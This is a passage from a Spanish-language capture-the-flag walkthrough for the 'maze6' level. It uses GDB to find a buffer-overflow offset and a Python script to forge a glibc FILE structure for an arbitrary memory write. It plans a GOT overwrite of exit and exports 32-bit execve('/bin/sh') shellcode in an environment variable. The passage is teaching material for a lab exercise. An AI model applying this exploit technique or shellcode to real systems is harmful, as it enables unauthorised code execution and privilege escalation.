asdf.txt : kkkk
</code></pre></div><p>Ahora todo funciona correctamente y podemos empezar a trabajar.</p><p>Para poder resolver este nivel, ponemos un <em>breakpoint</em> antes de <code>fprintf</code> y examinamos la estructura <code>FILE</code> legítima desde la máquina remota. Curiosamente, GDB ha cambiado su interfaz. Esta vez, usaré <code>gdb-peda</code> (solo porque <code>gef</code> no está instalado y <code>pwndbg</code> no funciona correctamente):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze6@maze</span>:<span class=code-blue>/tmp</span>$ gdb -q /maze/maze6
Reading symbols from /maze/maze6...done.
warning: ~/.gdbinit.local: No such file or directory
<span class=code-dark-red>gdb$</span> source /usr/local/peda/peda.py
<span class=code-dark-red>gdb-peda$</span>
</code></pre></div><p>Desensamblamos la función <code>main</code> y ponemos el <em>breakpoint</em> justo antes de la llamada a <code>fprintf</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-dark-red>gdb-peda$</span> disassemble main
Dump of assembler code for function main:
   0x0804855b &lt;+0&gt;:     push   ebp
   0x0804855c &lt;+1&gt;:     mov    ebp,esp
   0x0804855e &lt;+3&gt;:     sub    esp,0x104
   ...
   0x08048606 &lt;+171&gt;:   call   0x8048420 &lt;fprintf@plt&gt;
   0x0804860b &lt;+176&gt;:   add    esp,0x10
   0x0804860e &lt;+179&gt;:   push   0x0
   0x08048610 &lt;+181&gt;:   call   0x80483f0 &lt;exit@plt&gt;
End of assembler dump.
<span class=code-dark-red>gdb-peda$</span> break *0x08048606
Breakpoint 1 at 0x8048606: file maze6.c, line 40.
</code></pre></div><p>Ahora podemos lanzar el programa:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-dark-red>gdb-peda$</span> run asdf.txt AAAA
Starting program: /maze/maze6 asdf.txt AAAA
<span class=code-dark-blue>[----------------------------------registers-----------------------------------]</span>
<span class=code-dark-green>EAX</span>: <span class=code-dark-blue>0xffffd7cd</span> ("asdf.txt")
<span class=code-dark-green>EBX</span>: 0x0
<span class=code-dark-green>ECX</span>: <span class=code-dark-blue>0xffffd4d8</span> --&gt; 0x0
<span class=code-dark-green>EDX</span>: <span class=code-dark-blue>0xffffd4d4</span> ("kkkk")
<span class=code-dark-green>ESI</span>: 0x3
<span class=code-dark-green>EDI</span>: <span class=code-dark-blue>0xf7fc5000</span> --&gt; 0x1b2db0
<span class=code-dark-green>EBP</span>: <span class=code-dark-blue>0xffffd5d8</span> --&gt; 0x0
<span class=code-dark-green>ESP</span>: <span class=code-dark-blue>0xffffd4c4</span> --&gt; <span class=code-dark-blue>0x804a008</span> --&gt; 0xfbad3484
<span class=code-dark-green>EIP</span>: <span class=code-dark-red>0x8048606</span> (&lt;main+171&gt;:     call   0x8048420 &lt;fprintf@plt&gt;)
<span class=code-dark-green>EFLAGS</span>: 0x286 (<span class=code-dark-green>carry</span> <span class=code-red>PARITY</span> <span class=code-dark-green>adjust</span> <span class=code-dark-green>zero</span> <span class=code-red>SIGN</span> <span class=code-dark-green>trap</span> <span class=code-red>INTERRUPT</span> <span class=code-dark-green>direction</span> <span class=code-dark-green>overflow</span>)
<span class=code-dark-blue>[-------------------------------------code-------------------------------------]</span>
   0x80485fd &lt;main+162&gt;:        push   eax
   0x80485fe &lt;main+163&gt;:        push   0x80486bf
   0x8048603 &lt;main+168&gt;:        push   DWORD PTR [ebp-0x4]
=&gt; 0x8048606 &lt;main+171&gt;:        <span class=code-green>call   0x8048420 &lt;fprintf@plt&gt;</span>
   0x804860b &lt;main+176&gt;:        add    esp,0x10
   0x804860e &lt;main+179&gt;:        push   0x0
   0x8048610 &lt;main+181&gt;:        <span class=code-dark-green>call   0x80483f0 &lt;exit@plt&gt;</span>
   0x8048615:   xchg   ax,ax
Guessed arguments:
arg[0]: <span class=code-dark-blue>0x804a008</span> --&gt; 0xfbad3484
arg[1]: <span class=code-dark-green>0x80486bf</span> ("%s : %s\n")
arg[2]: <span class=code-dark-blue>0xffffd7cd</span> ("asdf.txt")
arg[3]: <span class=code-dark-blue>0xffffd4d4</span> ("kkkk")
<span class=code-dark-blue>[------------------------------------stack-------------------------------------]</span>
0000| <span class=code-dark-blue>0xffffd4c4</span> --&gt; <span class=code-dark-blue>0x804a008</span> --&gt; 0xfbad3484
0004| <span class=code-dark-blue>0xffffd4c8</span> --&gt; <span class=code-dark-green>0x80486bf</span> ("%s : %s\n")
0008| <span class=code-dark-blue>0xffffd4cc</span> --&gt; <span class=code-dark-blue>0xffffd7cd</span> ("asdf.txt")
0012| <span class=code-dark-blue>0xffffd4d0</span> --&gt; <span class=code-dark-blue>0xffffd4d4</span> ("kkkk")
0016| <span class=code-dark-blue>0xffffd4d4</span> ("kkkk")
0020| <span class=code-dark-blue>0xffffd4d8</span> --&gt; 0x0
0024| <span class=code-dark-blue>0xffffd4dc</span> --&gt; <span class=code-dark-red>0xf7ff1781</span> (add    esp,0x10)
0028| <span class=code-dark-blue>0xffffd4e0</span> --&gt; <span class=code-dark-red>0xf7ff215c</span> (add    esi,0xaea4)
<span class=code-dark-blue>[------------------------------------------------------------------------------]</span>
Legend: <span class=code-dark-red>code</span>, <span class=code-dark-blue>data</span>, <span class=code-dark-green>rodata</span>, value

Breakpoint 1, 0x08048606 in main (argc=0x3, argv=0xffffd674) at maze6.c:40
40      maze6.c: No such file or directory.
</code></pre></div><p>En este punto, vemos que el puntero a la estructura <code>FILE</code> es <code>0x804a008</code> (el primer argumento de <code>fprintf</code>). Podemos extraer los atributos de esta estructura como sigue:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-dark-red>gdb-peda$</span> p *((FILE*) 0x804a008)
$1 = {
  _flags = 0xfbad3484,
  _IO_read_ptr = 0x0,
  _IO_read_end = 0x0,
  _IO_read_base = 0x0,
  _IO_write_base = 0x0,
  _IO_write_ptr = 0x0,
  _IO_write_end = 0x0,
  _IO_buf_base = 0x0,
  _IO_buf_end = 0x0,
  _IO_save_base = 0x0,
  _IO_backup_base = 0x0,
  _IO_save_end = 0x0,
  _markers = 0x0,
  _chain = 0xf7fc5cc0 &lt;_IO_2_1_stderr_&gt;,
  _fileno = 0x3,
  _flags2 = 0x0,
  _old_offset = 0x0,
  _cur_column = 0x0,
  _vtable_offset = 0x0,
  _shortbuf = "",
  _lock = 0x804a0a0,
  _offset = 0xffffffffffffffff,
  __pad1 = 0x0,
  __pad2 = 0x804a0ac,
  __pad3 = 0x0,
  __pad4 = 0x0,
  __pad5 = 0x0,
  _mode = 0x0,
  _unused2 = '\000' &lt;repeats 39 times&gt;
}
</code></pre></div><p>Algunos atributos importantes para considerar son:</p><ul><li><code>_chain = 0xf7fc5cc0</code></li><li><code>_lock = 0x804a0a0</code></li><li><code>_offset = 0xffffffffffffffff</code></li></ul><p>Existe una clase en <code>pwntools</code> llamada <code>FileStructure</code> que parece interesante, pero no conseguí que funcionara correctamente.</p><p>También, tenemos qaue chequear los tipos de atributos de la estructura <code>FILE</code> y cómo se almacena en memoria:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-dark-red>gdb-peda$</span> ptype FILE
type = struct _IO_FILE {
    int _flags;
    char *_IO_read_ptr;
    char *_IO_read_end;
    char *_IO_read_base;
    char *_IO_write_base;
    char *_IO_write_ptr;
    char *_IO_write_end;
    char *_IO_buf_base;
    char *_IO_buf_end;
    char *_IO_save_base;
    char *_IO_backup_base;
    char *_IO_save_end;
    struct _IO_marker *_markers;
    struct _IO_FILE *_chain;
    int _fileno;
    int _flags2;
    __off_t _old_offset;
    unsigned short _cur_column;
    signed char _vtable_offset;
    char _shortbuf[1];
    _IO_lock_t *_lock;
    __off64_t _offset;
    void *__pad1;
    void *__pad2;
    void *__pad3;
    void *__pad4;
    size_t __pad5;
    int _mode;
    char _unused2[40];
}
<span class=code-dark-red>gdb-peda$</span> x/40x 0x804a008
0x804a008:      0xfbad3484      0x00000000      0x00000000      0x00000000
0x804a018:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a028:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a038:      0x00000000      0xf7fc5cc0      0x00000003      0x00000000
0x804a048:      0x00000000      0x00000000      0x0804a0a0      0xffffffff
0x804a058:      0xffffffff      0x00000000      0x0804a0ac      0x00000000
0x804a068:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a078:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a088:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a098:      0x00000000      0xf7fc3960      0x00000000      0x00000000
</code></pre></div><p>Existe otro valor relevante aquí: <code>vtable</code>, que es <code>0xf7fc3960</code>.</p><p>Para conseguir escritura arbitraria en la memoria, necesitamos controlar los atributos <code>_IO_buf_base</code> y <code>_IO_buf_end</code>, de manera que estos atributos apunten a las direcciones de inicio y fin de donde queremos escribir (la longitud será <code>_IO_buf_end - _IO_buf_base</code>).</p><p>Como disponemos de una vulnerabilidad de <em>Buffer Overflow</em>, somos capaces de modificar el puntero de la estructura <code>FILE</code> legítima y hacer que apunte a una maliciosa cargada en la pila.</p><p>Para ello, necesitamos calcular el <em>offset</em> necesario para sobrescribir el primer argumento de <code>fprintf</code>. Esto puede hacerse con <code>cyclic</code> de <code>pwntools</code> (utilizamos el cifrado XOR para poder calcular el <em>offset</em> después):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-dark-red>gdb-peda$</span> run asdf.txt "$(python -c 'from pwn import cyclic; print("".join(chr(42 ^ ord(b)) for b in cyclic(270)))')"
Starting program: /maze/maze6 asdf.txt "$(python -c 'from pwn import cyclic; print("".join(chr(42 ^ ord(b)) for b in cyclic(270)))')"
<span class=code-dark-blue>[----------------------------------registers-----------------------------------]</span>
<span class=code-dark-green>EAX</span>: <span class=code-dark-blue>0xffffd6c3</span> ("asdf.txt")
<span class=code-dark-green>EBX</span>: 0x0
<span class=code-dark-green>ECX</span>: <span class=code-dark-blue>0xffffd4d2</span> --&gt; 0xd5640000
<span class=code-dark-green>EDX</span>: <span class=code-dark-blue>0xffffd3c4</span> ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"...)
<span class=code-dark-green>ESI</span>: 0x3
<span class=code-dark-green>EDI</span>: <span class=code-dark-blue>0xf7fc5000</span> --&gt; 0x1b2db0
<span class=code-dark-green>EBP</span>: <span class=code-dark-blue>0xffffd4c8</span> ("paacqaacra")
<span class=code-dark-green>ESP</span>: <span class=code-dark-blue>0xffffd3b4</span> ("oaac\277\206\004\b\303\326\377\377\304\323\377\377aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaab"...)
<span class=code-dark-green>EIP</span>: <span class=code-dark-red>0x8048606</span> (&lt;main+171&gt;:     call   0x8048420 &lt;fprintf@plt&gt;)
<span class=code-dark-green>EFLAGS</span>: 0x282 (<span class=code-dark-green>carry</span> <span class=code-dark-green>parity</span> <span class=code-dark-green>adjust</span> <span class=code-dark-green>zero</span> <span class=code-red>SIGN</span> <span class=code-dark-green>trap</span> <span class=code-red>INTERRUPT</span> <span class=code-dark-green>direction</span> <span class=code-dark-green>overflow</span>)
<span class=code-dark-blue>[-------------------------------------code-------------------------------------]</span>
   0x80485fd &lt;main+162&gt;:        push   eax
   0x80485fe &lt;main+163&gt;:        push   0x80486bf
   0x8048603 &lt;main+168&gt;:        push   DWORD PTR [ebp-0x4]
=&gt; 0x8048606 &lt;main+171&gt;:        <span class=code-green>call   0x8048420 &lt;fprintf@plt&gt;</span>
   0x804860b &lt;main+176&gt;:        add    esp,0x10
   0x804860e &lt;main+179&gt;:        push   0x0
   0x8048610 &lt;main+181&gt;:        <span class=code-dark-green>call   0x80483f0 &lt;exit@plt&gt;</span>
   0x8048615:   xchg   ax,ax
Guessed arguments:
arg[0]: 0x6361616f ('oaac')
arg[1]: <span class=code-dark-green>0x80486bf</span> ("%s : %s\n")
arg[2]: <span class=code-dark-blue>0xffffd6c3</span> ("asdf.txt")
arg[3]: <span class=code-dark-blue>0xffffd3c4</span> ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"...)
<span class=code-dark-blue>[------------------------------------stack-------------------------------------]</span>
0000| <span class=code-dark-blue>0xffffd3b4</span> ("oaac\277\206\004\b\303\326\377\377\304\323\377\377aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaab"...)
0004| <span class=code-dark-blue>0xffffd3b8</span> --&gt; <span class=code-dark-green>0x80486bf</span> ("%s : %s\n")
0008| <span class=code-dark-blue>0xffffd3bc</span> --&gt; <span class=code-dark-blue>0xffffd6c3</span> ("asdf.txt")
0012| <span class=code-dark-blue>0xffffd3c0</span> --&gt; <span class=code-dark-blue>0xffffd3c4</span> ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"...)
0016| <span class=code-dark-blue>0xffffd3c4</span> ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"...)
0020| <span class=code-dark-blue>0xffffd3c8</span> ("baaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaac"...)
0024| <span class=code-dark-blue>0xffffd3cc</span> ("caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaac"...)
0028| <span class=code-dark-blue>0xffffd3d0</span> ("daaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaac"...)
<span class=code-dark-blue>[------------------------------------------------------------------------------]</span>
Legend: <span class=code-dark-red>code</span>, <span class=code-dark-blue>data</span>, <span class=code-dark-green>rodata</span>, value

Breakpoint 1, 0x08048606 in main (argc=0x6172, argv=0xffffd564) at maze6.c:40
40      in maze6.c
</code></pre></div><p>Y el primer parámetro se sobrescribe con <code>"oaac"</code>, que resulta en un <em>offset</em> de 256 bytes:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>pwn</span> cyclic -l oaac
256
</code></pre></div><p>Nótese que el patrón se almacena en la pila 16 bytes después del <em>offset</em>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-dark-red>gdb-peda$</span> x/50x $esp
0xffffd3b4:     0x6361616f      0x080486bf      0xffffd6c3      0xffffd3c4
0xffffd3c4:     0x61616161      0x61616162      0x61616163      0x61616164
0xffffd3d4:     0x61616165      0x61616166      0x61616167      0x61616168
0xffffd3e4:     0x61616169      0x6161616a      0x6161616b      0x6161616c
0xffffd3f4:     0x6161616d      0x6161616e      0x6161616f      0x61616170
0xffffd404:     0x61616171      0x61616172      0x61616173      0x61616174
0xffffd414:     0x61616175      0x61616176      0x61616177      0x61616178
0xffffd424:     0x61616179      0x6261617a      0x62616162      0x62616163
0xffffd434:     0x62616164      0x62616165      0x62616166      0x62616167
0xffffd444:     0x62616168      0x62616169      0x6261616a      0x6261616b
0xffffd454:     0x6261616c      0x6261616d      0x6261616e      0x6261616f
0xffffd464:     0x62616170      0x62616171      0x62616172      0x62616173
0xffffd474:     0x62616174      0x62616175
</code></pre></div><p>Por tanto, en lugar de <code>"oaac"</code>, podemos poner <code>0xffffd3c4</code> para que la estructura <code>FILE</code> comience ahí y el primer argumento de <code>fprintf</code> apunte a esa dirección en la pila.</p><p>Ahora construimos la estructura <code>FILE</code> maliciosa para poder cargarla en la pila. De momento, vamos a tratar de sobrescribir una variable de entorno, por ejemplo <code>USER=maze6</code>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-dark-red>gdb-peda$</span> shell echo $USER
maze6
<span class=code-dark-red>gdb-peda$</span> find USER
Searching for 'USER' in: None ranges
Found 1 results, display max 1 items:
[stack] : <span class=code-dark-blue>0xffffde6d</span> ("USER=maze6")
</code></pre></div><p>Por tanto, estos serán los valores para la estructura <code>FILE</code>:</p><ul><li><code>_chain = 0xf7fc5cc0</code></li><li><code>_lock = 0x804a0a0</code></li><li><code>_offset = 0xffffffffffffffff</code></li><li><code>vtable = 0xf7fc3960</code></li><li><code>_IO_buf_base = 0xffffde6d</code></li><li><code>_IO_buf_end = 0xffffde6d + 4</code></li></ul><p>Después de algunas pruebas, podemos desarrollar este <em>script</em> en Python que pone estos campos en un <em>payload</em>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/usr/bin/env</span> <span class=mtk3>python3</span>

<span class=mtk5>import</span> <span class="mtk8 mtku">os</span>
<span class=mtk5>import</span> <span class="mtk8 mtku">struct</span>

<span class=mtk1>env_addr</span>  <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>ffffde6d</span>
<span class=mtk1>file_addr</span> <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>ffffd3c8</span>
<span class=mtk1>length</span>    <span class=mtk5>=</span> <span class=mtk6>256</span>

<span class=mtk1>p32</span> <span class=mtk5>=</span> <span class="mtk7 mtki">lambda</span> <span class="mtk9 mtki">h</span><span class=mtk1>:</span> <span class="mtk8 mtku">struct</span><span class=mtk1>.</span><span class=mtk8>pack</span><span class=mtk1>(</span><span class=mtk4>'&lt;I'</span><span class=mtk1>,</span> <span class="mtk9 mtki">h</span><span class=mtk1>)</span>

<span class=mtk1>payload</span>  <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'ASDF'</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\0</span><span class=mtk4>'</span> <span class=mtk5>*</span> <span class=mtk6>28</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32</span><span class=mtk1>(</span><span class=mtk1>env_addr</span><span class=mtk1>)</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32</span><span class=mtk1>(</span><span class=mtk1>env_addr</span> <span class=mtk5>+</span> <span class=mtk6>4</span><span class=mtk1>)</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\0</span><span class=mtk4>'</span> <span class=mtk5>*</span> <span class=mtk6>16</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32</span><span class=mtk1>(</span><span class="mtk7 mtki">0x</span><span class=mtk6>f7fc5cc0</span><span class=mtk1>)</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\0</span><span class=mtk4>'</span> <span class=mtk5>*</span> <span class=mtk6>16</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32</span><span class=mtk1>(</span><span class="mtk7 mtki">0x</span><span class=mtk6>0804a0a0</span><span class=mtk1>)</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\xff</span><span class=mtk4>'</span> <span class=mtk5>*</span> <span class=mtk6>8</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\0</span><span class=mtk4>'</span> <span class=mtk5>*</span> <span class=mtk6>64</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32</span><span class=mtk1>(</span><span class="mtk7 mtki">0x</span><span class=mtk6>f7fc3960</span><span class=mtk1>)</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\0</span><span class=mtk4>'</span> <span class=mtk5>*</span> <span class=mtk1>(</span><span class=mtk1>length</span> <span class=mtk5>-</span> <span class=mtk8>len</span><span class=mtk1>(</span><span class=mtk1>payload</span><span class=mtk1>))</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32</span><span class=mtk1>(</span><span class=mtk1>file_addr</span><span class=mtk1>)</span>

<span class="mtk8 mtku">os</span><span class=mtk1>.</span><span class=mtk8>write</span><span class=mtk1>(</span><span class=mtk6>1</span><span class=mtk1>,</span> <span class="mtk8 mtku">bytes</span><span class=mtk1>(</span><span class=mtk6>42</span> <span class=mtk5>^</span> <span class=mtk1>b</span> <span class=mtk5>for</span> <span class=mtk1>b</span> <span class=mtk5>in</span> <span class=mtk1>payload</span><span class=mtk1>))</span>
</code></pre></div><p>Ahora podemos comprobar que todos los valores cargados son los esperados mirándolo en GDB:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-dark-red>gdb-peda$</span> run asdf.txt "$(python3 maze6.py)"
Starting program: /maze/maze6 asdf.txt "$(python3 maze6.py)"
<span class=code-dark-blue>[----------------------------------registers-----------------------------------]</span>  
<span class=code-dark-green>EAX</span>: <span class=code-dark-blue>0xffffd6cd</span> ("asdf.txt")
<span class=code-dark-green>EBX</span>: 0x0
<span class=code-dark-green>ECX</span>: <span class=code-dark-blue>0xffffd4d8</span> --&gt; 0x0
<span class=code-dark-green>EDX</span>: <span class=code-dark-blue>0xffffd3d4</span> ("ASDF")
<span class=code-dark-green>ESI</span>: 0x3
<span class=code-dark-green>EDI</span>: <span class=code-dark-blue>0xf7fc5000</span> --&gt; 0x1b2db0
<span class=code-dark-green>EBP</span>: <span class=code-dark-blue>0xffffd4d8</span> --&gt; 0x0
<span class=code-dark-green>ESP</span>: <span class=code-dark-blue>0xffffd3c4</span> --&gt; <span class=code-dark-blue>0xffffd3d8</span> --&gt; 0x0
<span class=code-dark-green>EIP</span>: <span class=code-dark-red>0x8048606</span> (&lt;main+171&gt;:     call   0x8048420 &lt;fprintf@plt&gt;)
<span class=code-dark-green>EFLAGS</span>: 0x286 (<span class=code-dark-green>carry</span> <span class=code-red>PARITY</span> <span class=code-dark-green>adjust</span> <span class=code-dark-green>zero</span> <span class=code-red>SIGN</span> trap <span class=code-red>INTERRUPT</span> <span class=code-dark-green>direction</span> <span class=code-dark-green>overflow</span>)
<span class=code-dark-blue>[-------------------------------------code-------------------------------------]</span>
   0x80485fd &lt;main+162&gt;:        push   eax
   0x80485fe &lt;main+163&gt;:        push   0x80486bf
   0x8048603 &lt;main+168&gt;:        push   DWORD PTR [ebp-0x4]
=&gt; 0x8048606 &lt;main+171&gt;:        <span class=code-green>call   0x8048420 &lt;fprintf@plt&gt;</span>
   0x804860b &lt;main+176&gt;:        add    esp,0x10
   0x804860e &lt;main+179&gt;:        push   0x0
   0x8048610 &lt;main+181&gt;:        <span class=code-dark-green>call   0x80483f0 &lt;exit@plt&gt;</span>
   0x8048615:   xchg   ax,ax
Guessed arguments:
arg[0]: <span class=code-dark-blue>0xffffd3d8</span> --&gt; 0x0
arg[1]: <span class=code-dark-green>0x80486bf</span> ("%s : %s\n")
arg[2]: <span class=code-dark-blue>0xffffd6cd</span> ("asdf.txt")
arg[3]: <span class=code-dark-blue>0xffffd3d4</span> ("ASDF")
<span class=code-dark-blue>[------------------------------------stack-------------------------------------]</span>
0000| <span class=code-dark-blue>0xffffd3c4</span> --&gt; <span class=code-dark-blue>0xffffd3d8</span> --&gt; 0x0
0004| <span class=code-dark-blue>0xffffd3c8</span> --&gt; <span class=code-dark-green>0x80486bf</span> ("%s : %s\n")
0008| <span class=code-dark-blue>0xffffd3cc</span> --&gt; <span class=code-dark-blue>0xffffd6cd</span> ("asdf.txt")
0012| <span class=code-dark-blue>0xffffd3d0</span> --&gt; <span class=code-dark-blue>0xffffd3d4</span> ("ASDF")
0016| <span class=code-dark-blue>0xffffd3d4</span> ("ASDF")
0020| <span class=code-dark-blue>0xffffd3d8</span> --&gt; 0x0
0024| <span class=code-dark-blue>0xffffd3dc</span> --&gt; 0x0
0028| <span class=code-dark-blue>0xffffd3e0</span> --&gt; 0x0
<span class=code-dark-blue>[------------------------------------------------------------------------------]</span>
Legend: <span class=code-dark-red>code</span>, <span class=code-dark-blue>data</span>, <span class=code-dark-green>rodata</span>, value

Breakpoint 1, 0x08048606 in main (argc=0x3, argv=0xffffd574) at maze6.c:40
40      in maze6.c
<span class=code-dark-red>gdb-peda$</span> p *((FILE*) 0xffffd3d8)
$3 = {
  _flags = 0x0,
  _IO_read_ptr = 0x0,
  _IO_read_end = 0x0,
  _IO_read_base = 0x0,
  _IO_write_base = 0x0,
  _IO_write_ptr = 0x0,
  _IO_write_end = 0x0,
  _IO_buf_base = 0xffffde6d "USER=maze6",
  _IO_buf_end = 0xffffde74 "ze6",
  _IO_save_base = 0x0,
  _IO_backup_base = 0x0,
  _IO_save_end = 0x0,
  _markers = 0x0,
  _chain = 0xf7fc5cc0 &lt;_IO_2_1_stderr_&gt;,
  _fileno = 0x0,
  _flags2 = 0x0,
  _old_offset = 0x0,
  _cur_column = 0x0,
  _vtable_offset = 0x0,
  _shortbuf = "",
  _lock = 0x804a0a0,
  _offset = 0xffffffffffffffff,
  __pad1 = 0x0,
  __pad2 = 0x0,
  __pad3 = 0x0,
  __pad4 = 0x0,
  __pad5 = 0x0,
  _mode = 0x0,
  _unused2 = '\000' &lt;repeats 39 times&gt;
}
</code></pre></div><p>Y parece que todo está correcto. Si continuamos, vemos que el valor cambia:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-dark-red>gdb-peda$</span> x/s 0xffffde6d
0xffffde6d:     "USER=maze6"  
<span class=code-dark-red>gdb-peda$</span> next
asdf.txt : ASDF

...

<span class=code-dark-red>gdb-peda$</span> x/s 0xffffde6d
0xffffde6d:     " : ASDFze6"
</code></pre></div><p>En este punto, la idea es sobrescribir el valor de <code>exit</code> en la Tabla de <em>Offsets</em> Globales (GOT) para saltar a la dirección de una variable de entorno que contenga <em>shellcode</em> para obtener una <em>shell</em></p><p>Podemos coger un <em>shellcode</em> de 32 bits y guardarlo en una variable de entorno:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze6@maze</span>:<span class=code-blue>/tmp</span>$ export TEST=$(python -c 'print("\x90" * 20 + "\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\xcd\x80")')  
<span class=code-green>maze6@maze</span>:<span class=code-blue>/tmp</span>$ echo $TEST | xxd
00000000: 9090 9090 9090 9090 9090 9090 9090 9090  ................
00000010: 9090 9090 31c9 6a0b 5851 682f 2f73 6868  ....1.j.XQh//shh
00000020: 2f62 696e 89e3 31d2 cd80 0a              /bin..1....
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze6@maze</span>:<span class=code-blue>/tmp</span>$ gdb -q /maze/maze6
Reading symbols from /maze/maze6...done.
